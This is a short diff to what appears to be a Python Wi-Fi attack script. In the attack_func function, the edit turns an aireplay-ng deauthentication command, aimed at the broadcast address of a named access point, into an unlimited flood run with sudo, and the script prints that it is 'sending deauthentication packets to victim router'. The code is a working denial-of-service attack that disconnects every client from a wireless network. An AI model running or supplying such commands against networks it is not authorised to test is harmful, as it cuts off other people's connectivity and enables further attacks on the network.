@@ -650,7 +650,7 @@ def attack_func(network_interface, attack_mode):
             except subprocess.TimeoutExpired:
                 process.kill()
             os.system(
-                f"""xterm -hold -e aireplay-ng -0 4000000 -e '{access_name}' -c FF:FF:FF:FF:FF:FF {network_interface} &""")
+                f"""xterm -hold -e sudo aireplay-ng --deauth 0 -e '{access_name}' -c FF:FF:FF:FF:FF:FF {network_interface} &""")
             subprocess.run(["clear"])
             script_banner()
             get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
